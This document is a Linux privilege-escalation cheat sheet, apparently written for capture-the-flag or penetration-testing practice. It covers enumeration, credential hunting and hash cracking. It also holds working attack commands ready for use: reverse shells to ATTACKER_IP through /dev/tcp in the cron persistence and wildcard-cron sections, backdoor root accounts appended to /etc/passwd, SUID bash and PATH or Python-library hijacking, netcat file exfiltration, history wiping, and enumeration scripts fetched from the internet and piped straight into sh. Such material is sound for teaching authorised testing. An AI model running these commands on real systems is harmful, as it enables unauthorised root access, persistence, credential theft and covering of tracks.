# Linux Privilege Escalation Methodology Checklist ♥

## Initial Reconnaissance:

```
# System Information
whoami
id
hostname
uname -a
cat /etc/issue
cat /etc/*-release

# Network Information
ifconfig
ip a
route
netstat -tulnpe
ss -tulnpe

# ARP Table
arp -a
ip neigh show

# Current User Context
pwd
echo $PATH
env
sudo -l

# Common dangerous binaries: nmap, vim, find, awk, more, less, man, etc.

find / -perm -4000 -name "find" 2>/dev/null
find / -perm -4000 -name "nmap" 2>/dev/null
find / -perm -4000 -name "vim" 2>/dev/null
find / -perm -4000 -name "bash" 2>/dev/null
```

## User & Group Enumeration:

```
# User Information
cat /etc/passwd
cat /etc/group
groups
find / -group NAME 2>/dev/null
last
lastlog
w
who -a

# Searching for valid users with a shell on the machine
cat /etc/passwd | grep 'sh$'
grep 'sh$' /etc/passwd

# Searching for a file
find / -name user.txt 2>/dev/null

# Sudo Privileges
sudo -l
cat /etc/sudoers

# Check PATH for writable directories
echo $PATH
echo $PATH | tr ':' '\n' | xargs -I {} ls -ld {} 2>/dev/null
```

## File System & Permissions:

```
# World-writable files
find / -perm -2 -type f 2>/dev/null
find / -writable -type f 2>/dev/null

# Critical file permissions
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/crontab
ls -la /etc/cron.*/*

# SUID/SGID Files
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# More comprehensive SUID search
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null

# Bash executable with root privileges
chmod 4777 /bin/bash
/bin/bash -p

# Checking Bash permissions
ls /bin/bash -la

# SUID Exploitation
find / -perm -4000 -type f 2>/dev/null | xargs ls -la

# NOSUID Mounts
cat /etc/fstab
mount
df -h

# Home Directories
ls -la /home/
ls -la /root/
```

## Process & Services:

```
# Running Processes
ps aux
ps -ef
ps aux | grep ssh
killall ssh
kill <PID>
top
htop

# Look for root processes
ps aux | grep root

# Check for unusual process relationships
pstree

# Cron Jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Cron PATH inspection
cat /etc/crontab | grep PATH
env | grep PATH

# Services
systemctl list-units --type=service
service --status-all
chkconfig --list 2>/dev/null
```

## Configuration Files:

```
# Common Config Files
ls -la /etc/passwd
ls -la /etc/shadow
cat /etc/shadow 2>/dev/null
ls -la /etc/group

# SSH Keys
ls -la ~/.ssh/
ls -la /root/.ssh/ 2>/dev/null

# Backup Files
find / -name "*.bak" -type f 2>/dev/null
find / -name "*backup*" -type f 2>/dev/null
```

## Credential Hunting:

```
# History Files
cat ~/.bash_history
cat /root/.bash_history 2>/dev/null

# Configuration Files
find / -name "*.conf" -type f 2>/dev/null | xargs grep -l "password" 2>/dev/null

# For current directory
grep -r -i "passw" * 2>/dev/null

# Web-app credential sweep
grep -R "password" /var/www 2>/dev/null

# System-wide search (more thorough but slower)
find / -type f -exec grep -i "passw" {} \; 2>/dev/null

# Quick config file search
find /etc -type f -exec grep -i "passw" {} \; 2>/dev/null

# Also look for other keywords:
grep -r -i -E "(password|passwd|pwd|secret|key|token)" * 2>/dev/null

# Database Files
find / -name "*.db" -type f 2>/dev/null
find / -name "*.sql" -type f 2>/dev/null

# Log Files
find /var/log -name "*.log" -type f 2>/dev/null | head -20
```

## Hash Identification & Cracking:

```
hash-identifier

# With hashcat modes (more reliable than hash-identifier)
hashid "c99175974b6e192936d97224638a34f8" -m

# For John the Ripper formats
hashid "c99175974b6e192936d97224638a34f8" -j

# Or show both Hashcat and John modes
hashid -m -j "c99175974b6e192936d97224638a34f8"

# See desired hashcat modes
hashcat --help | grep -i "md5"
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

## Persistence & Lateral Movement:

```
# SSH Keys
echo "ssh-rsa YOUR_PUB_KEY" >> ~/.ssh/authorized_keys
touch id_rsa
chmod 400 id_rsa
ssh -i id_rsa username@10.10.10.10.

# Cron Persistence
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'" >> /tmp/cronjob
crontab /tmp/cronjob

# Service Persistence
systemctl enable service_name

# Sending & receiving files
ncat -l -p 9000 > received_file.pdf
nc -q 0 10.10.10.10 9000 < 'sent_file.pdf'

# Creating a shadow link
ln -s /etc/shadow /home/user/shadow_link

# Interactive reverse shell
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
CTRL+Z
stty raw -echo; fg
```

## SSH Tunneling:

```
ssh -L 7777:127.0.0.1:8080 user@machine.htb -N -f
```

In this command, ```-L``` establishes the local port forwarding, ```7777``` is the local port on our machine, ```127.0.0.1:8080``` is the target on the remote machine, ```-N``` tells SSH not to execute any commands (just tunnel), and ```-f``` runs it in the background.

So, in this case opening the link ```http://localhost:7777``` in the browser allowed us to view the internal web application.

*Another Example:*

```
ssh -i id_rsa -L 8200:127.0.0.1:8200 user@machine.htb -N -f
curl -v localhost:8200
```

## Cleanup:

```
# Remove tools and logs
rm -f linpeas.sh lse.sh les.sh LinEnum.sh
history -c
```

## Additional Privilege Escalation Techniques:

### Wildcard PATH in Sudo:

```
# If sudo -l shows:
# (root) NOPASSWD: /home/user/scripts/*

# Create exploit in that directory:
echo '/bin/bash' > /home/user/scripts/legit-script
chmod +x /home/user/scripts/legit-script
sudo /home/user/scripts/legit-script
```

### Python Library Hijacking:

```
# If a Python script runs as root and imports modules
# Create malicious module in earlier PATH directory
echo 'import os; os.system("/bin/bash -p")' > /tmp/random.py
export PYTHONPATH=/tmp:$PYTHONPATH
```

### Exploiting Writable ```/etc/passwd```:

Understanding the format:

```
username:password:UID:GID:GECOS:home_directory:shell
test:x:0:0:root:/root:/bin/bash
```

Key fields:

- *Username:* 1-32 characters

- *Password:* ```x``` = hash in ```/etc/shadow```, or you can place raw password hash here

- *UID:* 0 = root, 1-99 = system accounts, 100-999 = administrative

- *GID:* Primary group ID

- *Shell:* Command interpreter (```/bin/bash```)

*Exploitation:*

```
# Check if writable
ls -la /etc/passwd

# Create password hash (if using in /etc/passwd directly)
openssl passwd -1 -salt exploit mypassword
# or
mkpasswd -m sha-512 mypassword

# Add backdoor user (using generated hash or just 'x')
echo "backdoor:generated_hash:0:0:root:/root:/bin/bash" >> /etc/passwd
# OR simpler approach:
echo "backdoor::0:0:root:/root:/bin/bash" >> /etc/passwd  # Empty password!
```

### Exploiting Writable ```/etc/shadow```:

```
# Check permissions
ls -la /etc/shadow

# Generate new password hash
mkpasswd -m sha-512 newpassword
# or on some systems:
openssl passwd -6 -salt randomsalt newpassword

# Replace root's password hash
# First backup:
cp /etc/shadow /etc/shadow.bak
# Then edit and replace root's hash with your generated one
```

### Cron Job PATH Exploitation:

```
# Check system crontab
cat /etc/crontab
cat /etc/cron.d/*

# Look for PATH variable starting with writable directories
# Example vulnerable PATH:
# PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Create malicious binary in writable PATH directory
echo '#!/bin/bash' > /home/user/overwrite.sh
echo 'cp /bin/bash /tmp/rootbash' >> /home/user/overwrite.sh
echo 'chmod +xs /tmp/rootbash' >> /home/user/overwrite.sh

chmod +x /home/user/overwrite.sh

# Wait for cron execution, then:
/tmp/rootbash -p
```

### Alternative Cron Exploitation Methods:

*Wildcard Cron Jobs:*

```
# If cron uses wildcards:
# * * * * * root /scripts/backup.sh *

# Create malicious files that get passed as arguments
echo '#!/bin/bash' > /home/user/--help
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /home/user/--help
chmod +x /home/user/--help
```

*Writable Scripts in Cron:*

```
# Find scripts called by cron
cat /etc/crontab
ls -la /etc/cron.*/*

# If any are writable, inject reverse shell or add user
echo 'echo "backdoor::0:0:root:/root:/bin/bash" >> /etc/passwd' >> /writable/script.sh
```

### PATH Manipulation Privilege Escalation:

When privileged scripts/programs call system commands without absolute paths, they rely on the PATH environment variable to find them. If we can control an earlier directory in PATH, we can hijack those commands!

*Basic Exploitation:*

```
# Check current PATH
echo $PATH

# Create malicious binary
echo '/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat

# Prepend writable directory to PATH
export PATH=/tmp:$PATH

# Now when privileged scripts run 'cat', they get our shell!
```

*Finding Exploitable Targets:*

```
# Find SUID binaries that might use relative paths
find / -perm -4000 -type f 2>/dev/null

# Check for scripts calling common commands without paths
grep -r "curl\|wget\|cat\|find\|ls\|echo" /etc/cron* /var/spool/cron* 2>/dev/null

# Look for custom scripts/software
find /opt /home /var -name "*.sh" -type f 2>/dev/null
find /etc -name "*.sh" -type f 2>/dev/null
```

#### Real-World Examples:

*Exploiting a backup script:*

```
# If /etc/cron.daily/backup contains:
# tar -czf /backups/backup.tar.gz /home/

# We can hijack 'tar':
echo '#!/bin/bash' > /tmp/tar
echo '/bin/bash -p' >> /tmp/tar  
chmod +x /tmp/tar
export PATH=/tmp:$PATH
```

*Service restart scripts:*

```
# If a service script runs:
# systemctl restart apache

# Create malicious systemctl:
echo '#!/bin/bash' > /tmp/systemctl
echo 'chmod +s /bin/bash' >> /tmp/systemctl
chmod +x /tmp/systemctl
export PATH=/tmp:$PATH
```

## Automated Tools:

```
# Popular Enumeration Scripts
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploit Suggester
curl -L https://github.com/mzet-/linux-exploit-suggester/raw/master/linux-exploit-suggester.sh -o les.sh && chmod +x les.sh && ./les.sh

# Linux Smart Enumeration
curl -L https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh -o lse.sh && chmod +x lse.sh && ./lse.sh

# LinEnum
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh
```
